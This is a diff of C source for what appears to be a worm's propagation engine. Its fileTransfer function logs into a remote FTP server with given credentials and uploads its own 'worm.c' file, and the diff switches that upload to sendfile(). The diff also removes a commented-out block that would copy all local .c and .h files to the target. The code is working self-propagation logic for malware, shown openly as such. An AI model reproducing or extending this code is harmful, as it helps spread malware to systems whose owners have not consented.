@@ -22,22 +22,18 @@ void parseIPPort(char buffer[], char *ip, int *port){
     char *ponto = ".";
     int i = 0, p1 = 0, p2 = 0;
     
-    /* get the first token */
     token = strtok(buffer, " ");
    
-    /* walk through other tokens */
     while(token != NULL) {
         aux = token;
         token = strtok(NULL, " ");
     }
  
-    /* get the first token */
     token = strtok(aux, "(");
     aux2 = strdup(token);
     token = strtok(aux2, ")");
     aux = strdup(token);
     
-    /* get the first token */
     token = strtok(aux, ",");
    
     while(token != NULL) {
@@ -62,7 +58,7 @@ void parseIPPort(char buffer[], char *ip, int *port){
 }
 
 void fileTransfer(char *ip, char *username, char *password){
-    char buffer[1024], file_buf[512];
+    char buffer[1024], file_buf[4096], toSend[1];
     char *ipT = (char*) malloc(sizeof(char));
     char user[100] = "USER ";
     char pass[100] = "PASS ";
@@ -78,7 +74,8 @@ void fileTransfer(char *ip, char *username, char *password){
     char c;
     DIR *dir;
     FILE *arq;
-    int i = 0, sent, tam_send = 0, temp, sock = 0, sockT, len = 0, status, size = 0, size2 = 0, port = 0, accept_socket;
+    int i = 0, sent, tam_send = 0, temp, sock = 0, sockT, len = 0, status, port = 0, accept_socket, count1 = 1, count2 = 1, fileSize;
+    off_t offset = 0; //file offset
     struct sockaddr_in serverAddr, transfSock, server;
     struct dirent *folder;
     struct stat obj;
@@ -239,55 +236,40 @@ void fileTransfer(char *ip, char *username, char *password){
         perror("");
         exit(1);
     }
+    
+    bzero(buffer, 1024);
+    recv(sock, buffer, sizeof(buffer), 0);
+    printf("%s", buffer);
 
-    if((arq = fopen("worm.c", "r")) == NULL){
+    sent = open("worm.c", O_RDONLY);
+
+    //if((arq = fopen("worm.c", "r")) == NULL){
+    if(sent < 0){
         printf("No such file on the local directory\n\n");
         exit(0);
     }
-   
-    status = stat("worm.c", &obj); 
-    size = obj.st_size;
-    temp = size;
-
-    printf("%d", size);
-    for(i=0; i<=9; i++ )   {
-        buffer[i] =  size%10;
-        size = size/10;
-        printf("%d", size);
-    }
+    //get size of file
+    fstat(sent, &obj);
     
-    if (send(sockT, buffer, 10, 0) == -1){
-        printf("Cant send file size...\n\n");
+    offset = 0;
+    status =  sendfile(sockT, sent, &offset, obj.st_size);
+    if(status < 0){ 
+        printf("error from sendfile\n\n");
         exit(1);
     }
 
-    //Resposta do Worm.c
-    bzero(buffer, 1024);
-    recv(sock, buffer, sizeof(buffer), 0);
-    printf("%s", buffer);
-
-    memset(file_buf, '0', sizeof(file_buf));
-    
-    i = 0;
-
-    tam_send = temp / 10;
-    
-    while(sent <= temp){
-        while(i < tam_send){
-            c = fgetc(arq);
-            file_buf[i] = c;
-            i+=1;
-        }
-        if (send(sockT, file_buf, tam_send, 0) < 0)
-        sent++;
-        tam_send += tam_send;
+    if (status != obj.st_size) {
+      printf("incomplete transfer from sendfile: %d of %d bytes\n", status, (int)obj.st_size);
+      exit(1);
     }
-
-    //Resposta do Worm.c
+    
     bzero(buffer, 1024);
-    recv(sock, buffer, sizeof(buffer), 0);
+    recv(sockT, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
- 
+
+    close(sent);
+    
+    close(sockT);
     if(sock >= 0){
         close(sock);
     }
@@ -296,38 +278,5 @@ void fileTransfer(char *ip, char *username, char *password){
 void propagation_engine(char* ip, char *username, char *pass){
     
     fileTransfer(ip, username, pass);
-
-    //catch files names and transfer via put ftp
-   /* dir = opendir(".");
-    if(dir){
-        while(folder = readdir(dir)){
-            if(!strcmp(folder->d_name, "."))
-                continue;
-            if(!strcmp(folder->d_name, ".."))
-                continue;
-
-            statFile = open(folder->d_name, O_RDONLY);
-            if(statFile == -1){
-                printf("No such file on the local directory\n\n");
-                exit(0);
-            } 
-
-            len = strlen(folder->d_name);
-            if (((len >= 2) && strcmp (&(folder->d_name[len - 2]), ".h") == 0) || ((len >= 2) && strcmp (&(folder->d_name[len - 2]), ".c") == 0)){
-                strcpy(buffer, "put ");
-                strcat(buffer, folder->d_name);
-                send(sock, buffer, 100, 0);
-                stat(folder->d_name, &obj);
-                size = obj.st_size;
-                send(sock, &size, sizeof(int), 0);
-                sendfile(sock, statFile, NULL, size);
-                recv(sock, &statFile, sizeof(int), 0);
-                if(statFile)
-                    printf("File stored successfully\n");
-                else
-                    printf("File failed to be stored to remote machine\n");
-            }
-        }
-    }*/
 
 }
